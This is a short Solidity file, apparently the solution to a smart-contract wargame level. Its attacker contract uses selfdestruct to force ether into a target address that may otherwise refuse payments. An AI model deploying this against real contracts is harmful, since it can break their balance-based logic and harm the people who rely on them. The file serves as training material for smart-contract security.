// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Cattacker {
    address immutable force;

    constructor(address _forceAddress) {
        force = _forceAddress;
    }

    receive() external payable {
        selfdestruct(payable(force));
    }
}